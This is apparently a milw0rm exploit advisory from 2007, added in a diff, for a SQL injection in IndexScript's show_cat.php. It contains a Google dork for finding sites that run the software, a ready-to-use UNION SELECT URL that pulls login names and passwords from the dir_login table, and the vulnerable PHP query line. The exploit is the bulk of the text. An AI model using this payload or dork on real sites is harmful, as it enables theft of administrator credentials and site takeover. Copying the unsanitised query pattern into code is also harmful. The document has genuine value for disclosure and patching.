@@ -1,0 +1,16 @@
+Site: http://indexscript.com
+Found By: xssvgamer
+
+Google Dork: allintext: "This site is powered by IndexScript"
+
+exploit:
+
+http://www.example.com/show_cat.php?cat_id=-1 UNION ALL SELECT login,password FROM dir_login /*
+
+Blind SQL injection in indexscript..
+
+Vul Code:
+"$sql = "select name, meta_title, meta_description, meta_keywords from dir_cat where " .
+ "cat_id=" . fnpreparesql($_GET['cat_id']);"
+
+# milw0rm.com [2007-07-25]
